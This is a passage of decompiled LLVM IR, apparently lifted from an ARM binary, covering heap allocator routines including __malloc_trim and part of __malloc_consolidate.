  store i32 %v3_132c0, i32* %r2.global-to-local, align 4
  %v0_132c4 = load i32, i32* @r6, align 4
  %v2_132c4 = sub i32 %v3_132bc, %v0_132c4
  store i32 %v2_132c4, i32* %r3.global-to-local, align 4
  %v1_132c8 = load i32, i32* @r7, align 4
  %v2_132c8 = add i32 %v1_132c8, %v2_132c4
  store i32 %v2_132c8, i32* %r1.global-to-local, align 4
  %v1_132cc = add i32 %v0_132bc, 872
  %v2_132cc = inttoptr i32 %v1_132cc to i32*
  %v3_132cc = load i32, i32* %v2_132cc, align 4
  store i32 %v3_132cc, i32* %r3.global-to-local, align 4
  %v1_132d4 = add i32 %v0_132bc, 884
  %v2_132d4 = inttoptr i32 %v1_132d4 to i32*
  %v3_132d4 = load i32, i32* %v2_132d4, align 4
  store i32 %v3_132d4, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_132c8, %v3_132c0
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_132b0
  store i32 %v2_132c8, i32* %v2_132c0, align 4
  %v0_132dc.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_132dc.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_132b0, %bb33
  %v1_132dc = phi i32 [ %v0_132bc, %dec_label_pc_132b0 ], [ %v1_132dc.pre, %bb33 ]
  %v0_132dc = phi i32 [ %v2_132c8, %dec_label_pc_132b0 ], [ %v0_132dc.pre, %bb33 ]
  %v2_132dc = add i32 %v1_132dc, 868
  %v3_132dc = inttoptr i32 %v2_132dc to i32*
  store i32 %v0_132dc, i32* %v3_132dc, align 4
  %v0_132e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_132e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_132e0 = add i32 %v1_132e0, %v0_132e0
  store i32 %v2_132e0, i32* %r1.global-to-local, align 4
  %v1_132e4 = load i32, i32* %r2.global-to-local, align 4
  %v0_132e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_132e8 = add i32 %v0_132e8, 8
  store i32 %v1_132e8, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_132e0, %v1_132e4
  br i1 %tmp43, label %bb35, label %dec_label_pc_1332c

bb35:                                             ; preds = %bb34
  %v5_132ec = load i32, i32* @r8, align 4
  %v6_132ec = add i32 %v5_132ec, 884
  %v7_132ec = inttoptr i32 %v6_132ec to i32*
  store i32 %v2_132e0, i32* %v7_132ec, align 4
  br label %dec_label_pc_1332c

dec_label_pc_132f4:                               ; preds = %dec_label_pc_13294
  %v0_132f4 = load i32, i32* @sb, align 4
  %v1_132f4 = add i32 %v0_132f4, 4
  store i32 %v1_132f4, i32* %r3.global-to-local, align 4
  %v0_132f8 = load i32, i32* @r6, align 4
  %v3_132f8 = icmp ult i32 %v0_132f8, %v1_132f4
  br i1 %v3_132f8, label %dec_label_pc_13308, label %dec_label_pc_132f4.dec_label_pc_13300_crit_edge

dec_label_pc_132f4.dec_label_pc_13300_crit_edge:  ; preds = %dec_label_pc_132f4
  %v0_13300.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13300

dec_label_pc_13300:                               ; preds = %dec_label_pc_132f4.dec_label_pc_13300_crit_edge, %dec_label_pc_13260
  %v0_13300 = phi i32 [ %v0_13300.pre, %dec_label_pc_132f4.dec_label_pc_13300_crit_edge ], [ %v0_13068, %dec_label_pc_13260 ]
  store i32 %v0_13300, i32* @r4, align 4
  br label %dec_label_pc_1332c

dec_label_pc_13308:                               ; preds = %dec_label_pc_132f4
  %v1_13308 = add i32 %v0_132f4, -7
  store i32 %v1_13308, i32* @r0, align 4
  %v0_1330c = call i32 @malloc()
  store i32 %v0_1330c, i32* @r0, align 4
  store i32 %v0_1330c, i32* @r4, align 4
  %v2_13310 = icmp eq i32 %v0_1330c, 0
  br i1 %v2_13310, label %dec_label_pc_1332c, label %dec_label_pc_13318

dec_label_pc_13318:                               ; preds = %dec_label_pc_13308
  %v0_13318 = load i32, i32* @r6, align 4
  %v1_13318 = add i32 %v0_13318, -8
  store i32 %v1_13318, i32* @r2, align 4
  %v0_1331c = load i32, i32* @r5, align 4
  store i32 %v0_1331c, i32* @r1, align 4
  %v0_13320 = call i32 @memcpy()
  %v0_13324 = load i32, i32* @r5, align 4
  store i32 %v0_13324, i32* @r0, align 4
  %v0_13328 = call i32 @free()
  store i32 %v0_13328, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1332c

dec_label_pc_1332c:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_13308, %dec_label_pc_13300, %dec_label_pc_13258, %.thread6, %dec_label_pc_130c8, %dec_label_pc_13318
  store i32 %v2_13014, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r2.global-to-local, align 4
  %v4_1333c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1333c)
  br label %dec_label_pc_13348

dec_label_pc_13348:                               ; preds = %dec_label_pc_13048, %dec_label_pc_12ff0, %dec_label_pc_12fd8, %dec_label_pc_1332c
  %v0_13348 = load i32, i32* @r4, align 4
  store i32 %v0_13348, i32* %r0.global-to-local, align 4
  store i32 %v3_12fb8, i32* @r4, align 4
  store i32 %v6_12fb8, i32* @r5, align 4
  store i32 %v9_12fb8, i32* @r6, align 4
  store i32 %v12_12fb8, i32* @r7, align 4
  store i32 %v15_12fb8, i32* @r8, align 4
  store i32 %v18_12fb8, i32* @sb, align 4
  store i32 %v21_12fb8, i32* @sl, align 4
  store i32 %v24_12fb8, i32* @fp, align 4
  store i32 %v27_12fb8, i32* @lr, align 4
  ret i32 %v0_13348

; uselistorder directives
  uselistorder i32 %v2_132e0, { 1, 0, 2 }
  uselistorder i32 %v2_132c8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_132a4, { 1, 0, 2 }
  uselistorder i32 %v3_13284, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13228, { 2, 1, 0 }
  uselistorder i32 %v2_131f8, { 1, 0, 2 }
  uselistorder i32 %v0_1318c, { 1, 0 }
  uselistorder i32 %v0_13148, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_130ac, { 0, 2, 1, 3 }
  uselistorder i32 %v2_130a4, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_13088, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_13080, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_1307c, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_1306c, { 1, 0 }
  uselistorder i32 %v0_13068, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_13040, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 21, 12, 14, 13, 20, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_13348, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1332c, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_13258, { 1, 0 }
  uselistorder label %dec_label_pc_131f8, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_13144, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13138, { 1, 0 }
  uselistorder label %dec_label_pc_13134, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_1335c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1335c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_1335c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1335c, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_1335c
  store i32 0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 0)
  %v0_13370.pr.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13370.pr.pr.pr, label %bb, label %.thread3..thread5_crit_edge

.thread3..thread5_crit_edge:                      ; preds = %.thread3
  %v4_13374.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %.thread3
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread3..thread5_crit_edge, %dec_label_pc_1335c, %bb
  %v4_13374 = phi i32 [ %v4_13374.pre, %.thread3..thread5_crit_edge ], [ %arg1, %dec_label_pc_1335c ], [ 0, %bb ]
  ret i32 %v4_13374

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_13378 = add i32 %arg2, 44
  %v2_13378 = inttoptr i32 %v1_13378 to i32*
  %v3_13378 = load i32, i32* %v2_13378, align 4
  %v12_1337c = load i32, i32* @r7, align 4
  %v1_13380 = add i32 %v3_13378, 4
  %v2_13380 = inttoptr i32 %v1_13380 to i32*
  %v3_13380 = load i32, i32* %v2_13380, align 4
  %v1_13384 = add i32 %arg2, 860
  %v2_13384 = inttoptr i32 %v1_13384 to i32*
  %v3_13384 = load i32, i32* %v2_13384, align 4
  store i32 %v3_13384, i32* @r4, align 4
  %v1_13388 = and i32 %v3_13380, -4
  store i32 %v1_13388, i32* @r6, align 4
  %v1_1338c = add i32 %v1_13388, -17
  %v2_13390 = add i32 %v1_1338c, %v3_13384
  store i32 %arg2, i32* @r5, align 4
  %v2_1339c = sub i32 %v2_13390, %arg1
  store i32 %v3_13384, i32* %r1.global-to-local, align 4
  %v2_133a4 = udiv i32 %v2_1339c, %v3_13384
  %v1_133a8 = add i32 %v2_133a4, -1
  store i32 %v1_133a8, i32* %r0.global-to-local, align 4
  %v2_133ac = mul i32 %v1_133a8, %v3_13384
  store i32 %v2_133ac, i32* @r7, align 4
  %v2_133b0 = icmp eq i32 %v2_133ac, 0
  store i1 %v2_133b0, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_133ac, 1
  br i1 %tmp8, label %dec_label_pc_13418, label %dec_label_pc_133b8

dec_label_pc_133b8:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_133bc = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_133bc, i32* %r0.global-to-local, align 4
  %v0_133c0 = load i32, i32* @r5, align 4
  %v1_133c0 = add i32 %v0_133c0, 44
  %v2_133c0 = inttoptr i32 %v1_133c0 to i32*
  %v3_133c0 = load i32, i32* %v2_133c0, align 4
  %v0_133c4 = load i32, i32* @r6, align 4
  %v2_133c4 = add i32 %v0_133c4, %v3_133c0
  %v9_133c8 = icmp eq i32 %v1_133bc, %v2_133c4
  store i1 %v9_133c8, i1* @cpsr_z, align 1
  store i32 %v1_133bc, i32* @r4, align 4
  br i1 %v9_133c8, label %dec_label_pc_133d4, label %dec_label_pc_13418

dec_label_pc_133d4:                               ; preds = %dec_label_pc_133b8
  %v0_133d4 = load i32, i32* @r7, align 4
  %v1_133d4 = sub i32 0, %v0_133d4
  store i32 %v1_133d4, i32* %r0.global-to-local, align 4
  %v1_133d8 = call i32 @__GI_sbrk(i32 %v1_133d4)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_133e0 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_133e0, i32* %r0.global-to-local, align 4
  %v7_133e4 = icmp eq i32 %v1_133e0, -1
  store i1 %v7_133e4, i1* @cpsr_z, align 1
  br i1 %v7_133e4, label %dec_label_pc_13418, label %dec_label_pc_133ec

dec_label_pc_133ec:                               ; preds = %dec_label_pc_133d4
  %v0_133ec = load i32, i32* @r4, align 4
  %v2_133ec = sub i32 %v0_133ec, %v1_133e0
  store i32 %v2_133ec, i32* %r0.global-to-local, align 4
  %v9_133ec = icmp eq i32 %v0_133ec, %v1_133e0
  store i1 %v9_133ec, i1* @cpsr_z, align 1
  br i1 %v9_133ec, label %dec_label_pc_13418, label %dec_label_pc_133f4

dec_label_pc_133f4:                               ; preds = %dec_label_pc_133ec
  %v0_133f4 = load i32, i32* @r5, align 4
  %v1_133f4 = add i32 %v0_133f4, 872
  %v2_133f4 = inttoptr i32 %v1_133f4 to i32*
  %v3_133f4 = load i32, i32* %v2_133f4, align 4
  %v1_133f8 = load i32, i32* @r6, align 4
  %v2_133f8 = sub i32 %v1_133f8, %v2_133ec
  store i32 %v2_133f8, i32* %r2.global-to-local, align 4
  %v1_133fc = add i32 %v0_133f4, 44
  %v2_133fc = inttoptr i32 %v1_133fc to i32*
  %v3_133fc = load i32, i32* %v2_133fc, align 4
  store i32 %v3_133fc, i32* %r1.global-to-local, align 4
  %v2_13400 = sub i32 %v3_133f4, %v2_133ec
  %v1_13404 = or i32 %v2_133f8, 1
  store i32 %v1_13404, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_13400, i32* %v2_133f4, align 4
  %v0_13410 = load i32, i32* %r2.global-to-local, align 4
  %v1_13410 = load i32, i32* %r1.global-to-local, align 4
  %v2_13410 = add i32 %v1_13410, 4
  %v3_13410 = inttoptr i32 %v2_13410 to i32*
  store i32 %v0_13410, i32* %v3_13410, align 4
  %v1_13424.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1341c

dec_label_pc_13418:                               ; preds = %dec_label_pc_133b8, %dec_label_pc_133ec, %dec_label_pc_133d4, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1341c

dec_label_pc_1341c:                               ; preds = %dec_label_pc_133f4, %dec_label_pc_13418
  %v1_13424 = phi i32 [ %v1_13424.pre, %dec_label_pc_133f4 ], [ 0, %dec_label_pc_13418 ]
  store i32 %v12_1337c, i32* @r7, align 4
  ret i32 %v1_13424

; uselistorder directives
  uselistorder i1 %v7_133e4, { 1, 0 }
  uselistorder i32 %v1_133e0, { 2, 1, 0, 3 }
  uselistorder i32 %v3_13384, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1341c, { 1, 0 }
  uselistorder label %dec_label_pc_13418, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13428 = load i32, i32* @r4, align 4
  store i32 %v3_13428, i32* %stack_var_-36, align 4
  %v0_1342c = load i32, i32* @r0, align 4
  %v1_1342c = inttoptr i32 %v0_1342c to i32*
  %v2_1342c = load i32, i32* %v1_1342c, align 4
  store i32 %v2_1342c, i32* %r3.global-to-local, align 4
  %v2_13430 = icmp eq i32 %v2_1342c, 0
  store i32 %v0_1342c, i32* @r4, align 4
  br i1 %v2_13430, label %dec_label_pc_13568.preheader, label %dec_label_pc_13444

dec_label_pc_13568.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1357025 = add i32 %v0_1342c, 52
  store i32 %v1_1357025, i32* %r3.global-to-local, align 4
  %v2_1357826 = add i32 %v0_1342c, 60
  %v3_1357827 = inttoptr i32 %v2_1357826 to i32*
  store i32 %v1_1357025, i32* %v3_1357827, align 4
  %v0_1357c28 = load i32, i32* %r3.global-to-local, align 4
  %v2_1357c29 = add i32 %v0_1357c28, 12
  %v3_1357c30 = inttoptr i32 %v2_1357c29 to i32*
  store i32 %v0_1357c28, i32* %v3_1357c30, align 4
  br label %dec_label_pc_13568.dec_label_pc_13568_crit_edge

dec_label_pc_13444:                               ; preds = %entry
  %v1_13444 = and i32 %v2_1342c, -3
  %v3_13448 = udiv i32 %v2_1342c, 8
  store i32 %v3_13448, i32* %r2.global-to-local, align 4
  store i32 %v1_13444, i32* %v1_1342c, align 4
  %v0_13450 = load i32, i32* @r0, align 4
  %v1_13450 = add i32 %v0_13450, -4
  store i32 %v1_13450, i32* %r3.global-to-local, align 4
  %v1_13454 = load i32, i32* %r2.global-to-local, align 4
  %v4_13454 = mul i32 %v1_13454, 4
  %v5_13454 = add i32 %v4_13454, %v1_13450
  store i32 %v5_13454, i32* %sb.global-to-local, align 4
  %v1_13458 = add i32 %v0_13450, 52
  store i32 %v1_13458, i32* %r7.global-to-local, align 4
  %v1_1345c = add i32 %v0_13450, 4
  store i32 %v1_1345c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_13464

dec_label_pc_13464:                               ; preds = %dec_label_pc_13560, %dec_label_pc_13444
  %v1_1355810 = phi i32 [ %v1_13558, %dec_label_pc_13560 ], [ %v5_13454, %dec_label_pc_13444 ]
  %v1_13470 = phi i32 [ %v1_13560, %dec_label_pc_13560 ], [ %v1_1345c, %dec_label_pc_13444 ]
  %v1_13464 = inttoptr i32 %v1_13470 to i32*
  %v2_13464 = load i32, i32* %v1_13464, align 4
  store i32 %v2_13464, i32* %r1.global-to-local, align 4
  %v2_13468 = icmp eq i32 %v2_13464, 0
  br i1 %v2_13468, label %dec_label_pc_13558, label %dec_label_pc_13470

dec_label_pc_13470:                               ; preds = %dec_label_pc_13464
  %v0_13470 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_13470, i32* %v1_13464, align 4
  %v0_13474.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13474

dec_label_pc_13474:                               ; preds = %dec_label_pc_1354c, %dec_label_pc_13470
  %v0_13490 = phi i32 [ %v0_1354c, %dec_label_pc_1354c ], [ %v0_13474.pre, %dec_label_pc_13470 ]
  %v1_13474 = add i32 %v0_13490, 4
  %v2_13474 = inttoptr i32 %v1_13474 to i32*
  %v3_13474 = load i32, i32* %v2_13474, align 4
  store i32 %v3_13474, i32* %r3.global-to-local, align 4
  %v1_13478 = and i32 %v3_13474, -2
  store i32 %v1_13478, i32* %lr.global-to-local, align 4
  %v2_1347c = add i32 %v1_13478, %v0_13490
  store i32 %v2_1347c, i32* @r0, align 4
  %v1_13480 = urem i32 %v3_13474, 2
  %v2_13480 = icmp eq i32 %v1_13480, 0
  %v1_13484 = add i32 %v0_13490, 8
  %v2_13484 = inttoptr i32 %v1_13484 to i32*
  %v3_13484 = load i32, i32* %v2_13484, align 4
  store i32 %v3_13484, i32* %sl.global-to-local, align 4
  %v1_13488 = add i32 %v2_1347c, 4
  %v2_13488 = inttoptr i32 %v1_13488 to i32*
  %v3_13488 = load i32, i32* %v2_13488, align 4
  store i32 %v3_13488, i32* %r8.global-to-local, align 4
  br i1 %v2_13480, label %dec_label_pc_13490, label %dec_label_pc_134c4

dec_label_pc_13490:                               ; preds = %dec_label_pc_13474
  %v1_13490 = inttoptr i32 %v0_13490 to i32*
  %v2_13490 = load i32, i32* %v1_13490, align 4
  store i32 %v2_13490, i32* %r5.global-to-local, align 4
  %v2_13494 = sub i32 %v0_13490, %v2_13490
  store i32 %v2_13494, i32* %r3.global-to-local, align 4
  %v1_13498 = add i32 %v2_13494, 8
  %v2_13498 = inttoptr i32 %v1_13498 to i32*
  %v3_13498 = load i32, i32* %v2_13498, align 4
  store i32 %v3_13498, i32* %ip.global-to-local, align 4
  %v1_1349c = add i32 %v3_13498, 12
  %v2_1349c = inttoptr i32 %v1_1349c to i32*
  %v3_1349c = load i32, i32* %v2_1349c, align 4
  store i32 %v3_1349c, i32* %r1.global-to-local, align 4
  %v9_134a0 = icmp eq i32 %v3_1349c, %v2_13494
  %v1_134a4 = add i32 %v2_13494, 12
  %v2_134a4 = inttoptr i32 %v1_134a4 to i32*
  %v3_134a4 = load i32, i32* %v2_134a4, align 4
  store i32 %v3_134a4, i32* %r2.global-to-local, align 4
  br i1 %v9_134a0, label %dec_label_pc_134ac, label %dec_label_pc_13508

dec_label_pc_134ac:                               ; preds = %dec_label_pc_13490
  %v1_134ac = add i32 %v3_134a4, 8
  %v2_134ac = inttoptr i32 %v1_134ac to i32*
  %v3_134ac = load i32, i32* %v2_134ac, align 4
  store i32 %v3_134ac, i32* %r3.global-to-local, align 4
  %v9_134b0 = icmp eq i32 %v3_134ac, %v2_13494
  br i1 %v9_134b0, label %dec_label_pc_134b8, label %dec_label_pc_13508

dec_label_pc_134b8:                               ; preds = %dec_label_pc_134ac
  store i32 %v3_13498, i32* %v2_134ac, align 4
  %v0_134bc = load i32, i32* %r2.global-to-local, align 4
  %v1_134bc = load i32, i32* %ip.global-to-local, align 4
  %v2_134bc = add i32 %v1_134bc, 12
  %v3_134bc = inttoptr i32 %v2_134bc to i32*
  store i32 %v0_134bc, i32* %v3_134bc, align 4
  %v0_134c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_134c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_134c0 = add i32 %v1_134c0, %v0_134c0
  store i32 %v2_134c0, i32* %lr.global-to-local, align 4
  %v0_134c8.pre = load i32, i32* @r0, align 4
  %v0_134cc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_134c4

dec_label_pc_134c4:                               ; preds = %dec_label_pc_13474, %dec_label_pc_134b8
  %v0_1353c = phi i32 [ %v1_13478, %dec_label_pc_13474 ], [ %v2_134c0, %dec_label_pc_134b8 ]
  %v0_134cc = phi i32 [ %v3_13488, %dec_label_pc_13474 ], [ %v0_134cc.pre, %dec_label_pc_134b8 ]
  %v1_134e0 = phi i32 [ %v2_1347c, %dec_label_pc_13474 ], [ %v0_134c8.pre, %dec_label_pc_134b8 ]
  %v0_134c4 = load i32, i32* @r4, align 4
  %v1_134c4 = add i32 %v0_134c4, 44
  %v2_134c4 = inttoptr i32 %v1_134c4 to i32*
  %v3_134c4 = load i32, i32* %v2_134c4, align 4
  store i32 %v3_134c4, i32* %r3.global-to-local, align 4
  %v9_134c8 = icmp eq i32 %v1_134e0, %v3_134c4
  %v1_134cc = and i32 %v0_134cc, -4
  store i32 %v1_134cc, i32* %r5.global-to-local, align 4
  br i1 %v9_134c8, label %dec_label_pc_1353c, label %dec_label_pc_134d4

dec_label_pc_134d4:                               ; preds = %dec_label_pc_134c4
  %v2_134d4 = add i32 %v1_134e0, %v1_134cc
  store i32 %v2_134d4, i32* %r3.global-to-local, align 4
  %v1_134d8 = add i32 %v2_134d4, 4
  %v2_134d8 = inttoptr i32 %v1_134d8 to i32*
  %v3_134d8 = load i32, i32* %v2_134d8, align 4
  store i32 %v3_134d8, i32* %r3.global-to-local, align 4
  %v1_134dc = urem i32 %v3_134d8, 2
  %v2_134dc = icmp eq i32 %v1_134dc, 0
  %v2_134e0 = add i32 %v1_134e0, 4
  %v3_134e0 = inttoptr i32 %v2_134e0 to i32*
  store i32 %v1_134cc, i32* %v3_134e0, align 4
  br i1 %v2_134dc, label %dec_label_pc_134e8, label %dec_label_pc_134d4.dec_label_pc_13518_crit_edge

dec_label_pc_134d4.dec_label_pc_13518_crit_edge:  ; preds = %dec_label_pc_134d4
  %v0_1351c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13518

dec_label_pc_134e8:                               ; preds = %dec_label_pc_134d4
  %v0_134e8 = load i32, i32* @r0, align 4
  %v1_134e8 = add i32 %v0_134e8, 8
  %v2_134e8 = inttoptr i32 %v1_134e8 to i32*
  %v3_134e8 = load i32, i32* %v2_134e8, align 4
  store i32 %v3_134e8, i32* %ip.global-to-local, align 4
  %v1_134ec = add i32 %v3_134e8, 12
  %v2_134ec = inttoptr i32 %v1_134ec to i32*
  %v3_134ec = load i32, i32* %v2_134ec, align 4
  store i32 %v3_134ec, i32* %r3.global-to-local, align 4
  %v9_134f0 = icmp eq i32 %v3_134ec, %v0_134e8
  %v1_134f4 = add i32 %v0_134e8, 12
  %v2_134f4 = inttoptr i32 %v1_134f4 to i32*
  %v3_134f4 = load i32, i32* %v2_134f4, align 4
  store i32 %v3_134f4, i32* %r2.global-to-local, align 4
  br i1 %v9_134f0, label %dec_label_pc_134fc, label %dec_label_pc_13508

dec_label_pc_134fc:                               ; preds = %dec_label_pc_134e8
  %v1_134fc = add i32 %v3_134f4, 8
  %v2_134fc = inttoptr i32 %v1_134fc to i32*
  %v3_134fc = load i32, i32* %v2_134fc, align 4
  store i32 %v3_134fc, i32* %r3.global-to-local, align 4
  %v9_13500 = icmp eq i32 %v3_134fc, %v0_134e8
  br i1 %v9_13500, label %dec_label_pc_1350c, label %dec_label_pc_13508

dec_label_pc_13508:                               ; preds = %dec_label_pc_134e8, %dec_label_pc_134ac, %dec_label_pc_13490, %dec_label_pc_134fc
  %v0_13508 = call i32 @abort()
  store i32 %v0_13508, i32* @r0, align 4
  %v0_1350c.pre = load i32, i32* @ip, align 4
  %v1_1350c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1350c

dec_label_pc_1350c:                               ; preds = %dec_label_pc_134fc, %dec_label_pc_13508
  %v1_1350c = phi i32 [ %v3_134f4, %dec_label_pc_134fc ], [ %v1_1350c.pre, %dec_label_pc_13508 ]
  %v0_1350c = phi i32 [ %v3_134e8, %dec_label_pc_134fc ], [ %v0_1350c.pre, %dec_label_pc_13508 ]
  %v2_1350c = add i32 %v1_1350c, 8
  %v3_1350c = inttoptr i32 %v2_1350c to i32*
  store i32 %v0_1350c, i32* %v3_1350c, align 4
  %v0_13510 = load i32, i32* %r2.global-to-local, align 4
  %v1_13510 = load i32, i32* %ip.global-to-local, align 4
  %v2_13510 = add i32 %v1_13510, 12
  %v3_13510 = inttoptr i32 %v2_13510 to i32*
  store i32 %v0_13510, i32* %v3_13510, align 4
  %v0_13514 = load i32, i32* %lr.global-to-local, align 4
  %v1_13514 = load i32, i32* %r5.global-to-local, align 4
  %v2_13514 = add i32 %v1_13514, %v0_13514
  store i32 %v2_13514, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13518

dec_label_pc_13518:                               ; preds = %dec_label_pc_134d4.dec_label_pc_13518_crit_edge, %dec_label_pc_1350c
  %v0_1351c = phi i32 [ %v0_1351c.pre, %dec_label_pc_134d4.dec_label_pc_13518_crit_edge ], [ %v2_13514, %dec_label_pc_1350c ]
  %v0_13518 = load i32, i32* %r7.global-to-local, align 4
  %v1_13518 = add i32 %v0_13518, 8
  %v2_13518 = inttoptr i32 %v1_13518 to i32*
  %v3_13518 = load i32, i32* %v2_13518, align 4
  store i32 %v3_13518, i32* %r2.global-to-local, align 4
  %v1_1351c = or i32 %v0_1351c, 1
  store i32 %v1_1351c, i32* %r3.global-to-local, align 4
  %v0_13520 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13520, i32* %v2_13518, align 4
  %v0_13524 = load i32, i32* %r1.global-to-local, align 4
  %v1_13524 = load i32, i32* %r2.global-to-local, align 4
  %v2_13524 = add i32 %v1_13524, 12
  %v3_13524 = inttoptr i32 %v2_13524 to i32*
  store i32 %v0_13524, i32* %v3_13524, align 4
  %v0_13528 = load i32, i32* %lr.global-to-local, align 4
  %v1_13528 = load i32, i32* %r1.global-to-local, align 4
  %v3_13528 = add i32 %v1_13528, %v0_13528
  %v4_13528 = inttoptr i32 %v3_13528 to i32*
  store i32 %v0_13528, i32* %v4_13528, align 4
  %v0_1352c = load i32, i32* %r3.global-to-local, align 4
  %v1_1352c = load i32, i32* %r1.global-to-local, align 4
  %v2_1352c = add i32 %v1_1352c, 4
  %v3_1352c = inttoptr i32 %v2_1352c to i32*
  store i32 %v0_1352c, i32* %v3_1352c, align 4
  %v0_13530 = load i32, i32* %r2.global-to-local, align 4
  %v1_13530 = load i32, i32* %r1.global-to-local, align 4
  %v2_13530 = add i32 %v1_13530, 8
  %v3_13530 = inttoptr i32 %v2_13530 to i32*
  store i32 %v0_13530, i32* %v3_13530, align 4
  %v0_13534 = load i32, i32* %r7.global-to-local, align 4
  %v1_13534 = load i32, i32* %r1.global-to-local, align 4
  %v2_13534 = add i32 %v1_13534, 12
  %v3_13534 = inttoptr i32 %v2_13534 to i32*
  store i32 %v0_13534, i32* %v3_13534, align 4
